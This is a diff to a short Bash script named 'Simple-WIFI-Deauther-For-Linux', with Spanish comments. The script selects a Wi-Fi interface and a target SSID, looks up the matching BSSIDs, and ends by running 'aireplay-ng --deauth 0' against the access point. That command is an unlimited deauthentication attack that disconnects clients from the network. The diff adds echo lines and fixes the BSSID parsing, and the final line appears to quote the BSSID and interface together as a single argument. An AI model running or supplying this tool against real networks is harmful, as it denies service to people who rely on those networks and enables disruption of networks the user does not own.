@@ -2,6 +2,7 @@
 set -euo pipefail
 
 echo "Simple-WIFI-Deauther-For-Linux"
+echo -e "\n"
 
 # 1) Interfaces Wi-Fi
 mapfile -t IFACES < <(
@@ -34,8 +35,8 @@ done
 
 # 4) BSSIDs (MACs) para ese SSID
 mapfile -t BSSIDS < <(
-  nmcli -t -f BSSID,SSID dev wifi list ifname "$IFACE" \
-  | awk -F: -v ssid="$SSID" '$0 ~ ssid"$"{print $1}'
+  nmcli -t --separator ';' -f BSSID,SSID dev wifi list ifname "$IFACE" \
+  | awk -F';' -v ssid="$SSID" '$2==ssid {print $1}'
 )
 
 [ ${#BSSIDS[@]} -eq 0 ] && { echo "SSID sin BSSID visible."; exit 1; }
@@ -48,5 +49,6 @@ done
 
 # 5) Comando final
 echo
-echo "Ejecutando Deauther:"
+echo "Ejecutando Deauther..."
+echo -e "\n"
 aireplay-ng --deauth 0 -a "$BSSID $IFACE"
